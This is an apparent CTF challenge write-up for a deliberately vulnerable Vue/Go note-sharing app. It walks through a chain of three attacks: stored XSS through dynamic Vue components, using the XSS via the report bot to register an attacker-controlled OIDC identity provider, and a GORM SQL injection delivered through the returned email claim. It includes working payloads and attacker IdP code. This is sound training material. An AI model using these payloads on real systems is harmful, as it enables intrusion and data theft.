![img](assets/banner.png)

<img src='assets/htb.png' style='zoom: 80%;' align=left /> <font size='10'>SOS or SSO?</font>

23<sup>rd</sup> April 2024

Prepared By: `MasterSplinter`

Challenge Author(s): `MasterSplinter`

Difficulty: <font color='red'>Hard</font>

<br><br>

# Story

The crew has found amongst the rubble an old computer running an ancient application that was once used to write and share notes, it is rumored that this application was responsible for grave misunderstandings between superpowers which led to nuclear war. Some say the secret to a stable and flourishing society lies in one of these notes, but wait! Someone seems to be still online!

Fake flag is found in the `entrypoint.sh` file and should be substituted on deploy.

# Synopsis

- The user must find how the note content is processed by the Vue app, realizing that binding values directly to a component can be dangerous
- Using such finding to exploit the XSS vulnerability
- The user must realise that the only way to log into the application is through OpenID Connect SSO integration
- Using the XSS vulnerability through the "report" function the user can submit a custom IdP configuration
- The custom IdP configuration which is now controlled by the attacker is then used to return arbitrary data as `email` parameter
- This is used to exploit the SQL injection in the ban checking system
- In order to exploit the SQL injection the attacker must create their own controlled IdP which can return a query that makes every note (or the note containing the flag) public so that he can read it.

## Description (!)

- The vulnerable application is a note taking application that allows its users to log in using their country's respective SSO. It is possible to write notes without logging in but they will be public, logged in users can create notes that will be shared with the rest of the user's using the same SSO provider. They can also create private notes which only they can read.
- There are three roles: user, support and admin. The default role is user, there is one support and one admin role which share the same tenant. The support user is active and is simulated by a headless browser that, upon the reporting of a note, logs in, looks for banned words and then removes the note.
- The support user has access to the sso settings and edit/create them. 
- The admin user can do everything the support user can but also ban users
- The goal is to be able to read a private note created by the administrator of the application

## Skills Required (!)

- VueJS
- OAuth2 and OIDC protocol
- Golang
- SQLite

## Skills Learned (!)

- Learn how dynamic VueJS components can be dangerous and cause XSS
- Learn how to create a malicious Identity Provider which can be used to test Service Providers
- Learn how it can be dangerous for a service provider to trust everything that is coming from the IdP
- Learn how to exploit a blind SQLi through an unusual scenario

# Enumeration (!)

## Analyzing the source code (*)

Since a lot of source code is provided in this challenge here is a high level breakdown of the folder structure:
- backend/
    - auth/
        - `jwt.go` -> contains all the code needed to generate and validate JWT tokens used by the application
        - `sso.go` -> this contains the OIDC implementation that integrates with the IdP, it contains function to validate endpoints, get the redirect urls for different clients and process the callback functionality
        - `user.go` -> contains only one function used to register a user to the database
    - database/
        - `conn.go` -> contains the logic to create the database and fill it with some data
        - `entities.go` -> defines the entities in the database using GORM 
        - `queries.go` -> contains all the queries needed for the application logic, using also GORM
    - endpoints/
        - `admin.go` -> admin only endpoints, get and ban users
        - `auth.go` -> endpoints that implement the `sso.go` functionality for logging in. also contain logout and logic to get the current logged in user
        - `middleware.go` -> contains required middlewares: middleware to check user's role and csrf protection
        - `notes.go` -> contains endpoints related to the notes: list, create, delete, report, edit.
        - `support.go` -> support only endpoints, creating factions and adding OIDC configurations
    - models/ -> models for response and request objects
    - util/
        - `main.go` -> contains code for the headless browser simulating the support user.
    `main.go` -> defines web server and exposes the routes.

The frontend folder is a standard vite project structure.

# Solution (!)

## Exploitation (!)

### Step 1 - XSS via VueJS dynamic components

In `frontend/src/views/EditorView.vue`, the code responsible for the rich-text rendering of the application is found:

```html
<div class="editor" v-if="note">
    <h1>{{ note.title }}</h1>
    <div class="editor-text">
      <div>
        <component
          :is="item.type"
          v-bind="item.attr"
          v-for="(item, i) in noteContent"
          contenteditable="true"
          :ref="`item-${i}`"
          @focus="focused = i"
          @input="handleInput($event, i)"
          class="editor-element"
          >{{ noteContent[i].content }}</component
        >
      </div>
    </div>
```

The `noteContent` array is iterated over and based on the `type` key of each object contained, a different element is created. This is dangerous because it allows an attacker to create arbitrary DOM elements, additionally `v-bind` is being used to style and give properties to the element, which can be exploited to achieve XSS.

The attacker wants the item to look like so:
```json
{"type": "img", "attr": {"src": "x", "onerror": "alert(1)"}}
```

Which will result in the `onerror` callback to be executed as the resulting DOM element created would be `<img src=x onerror=alert(1)`.

The attacker can achieve this by modifying the base64 request sent when saving a note and inject their payload.

### Step 2 - XSS to IdP config submission

The XSS can be exploited by reporting the note containing the payload, this will lead the support user to visit it, giving the attacker full control over their browser.

The XSS can be used to submit an attacker controlled IdP configuration with the following JS code:

```js
fetch(
    '/api/support/faction/1/config',
    {
        method: 'POST',
        headers: {
            'X-NOTES-CSRF-PROTECTION': '1'
        },
        body: JSON.stringify({clientId:'%s',clientSecret:'%s',endpoint:'%s'})
    }
)
```

This allows the attacker to tap into the SSO flow and move onto the next step


### Step 3 - The SQLi

In `backend/auth/sso.go` the following code can be found:

```go
	info, err := ssoSession.Provider.UserInfo(ctx, &tokenProvider{token: oauth2Token})
	if err != nil {
		return "", err
	}

	// Extract custom claims
	var claims SSOClaims
	if err := info.Claims(&claims); err != nil {
		return "", errors.New("invalid claims: " + err.Error())
	}

	if claims.Email == nil {
		return "", errors.New("email not returned from IdP")
	}

	ban := database.GetBan(*claims.Email)
	if ban != nil {
		return "", errors.New("you got banned!")
	}

	user := database.FindUserWithEmail(*claims.Email)
	if user == nil {
		user = RegisterUser(claims, ssoSession.FactionID)
	} else {
		if user.FactionID != uint64(ssoSession.FactionID) {
			return "", errors.New("wrong faction buddy")
		}
		log.Println("Logged in!", user.Email)
	}

	return GenerateToken(user, 1800)
```

This code requests the user information from the IdP and uses the returned email to check if the user was banned, if not the user is either registered or logged in.

The vulnerable part here is the `GetBan` function:

```go
func GetBan(email string) *Ban {
	var ban Ban
	tx := DB.First(&ban, email)
	if tx.Error != nil {
		log.Println(tx.Error)
		return nil
	}
	return &ban
}
```

Although it does not seem dangerous since `email` is the primary key of the `bans` table, GORM actually warns about this being vulnerable to SQL injection [here](https://gorm.io/docs/security.html#Inline-Condition)

The email can be set to something like: 
```
'tom@ca.htb'; UPDATE `notes` SET author_id=NULL,private=0 -- -
```

Which updates all the notes to public, allowing the attacker to see the flag.

### Step 4 - Putting it all together

The attacker must create their own IdP implementation which serves the SQLi payload as the email returned from the user-info endpoint, something like:

```go
	r.GET("/oidc/userinfo", func(c *gin.Context) {
		c.JSON(200, gin.H{
			"email": "'tom@ca.htb'; UPDATE `notes` SET author_id=NULL,private=0 -- -",
		})
	})
```

The attacker must trigger the XSS found through the support user to register their malicious IdP.

After attempting to authenticate with their malicious IdP, code responsible for the SSO login will fetch the SQLi payload in the `email` parameter, making all the notes public and making it possible for the attacker to get the flag.

## Solver

The solver is a golang written program that automates the steps described above and creates a malicious IdP.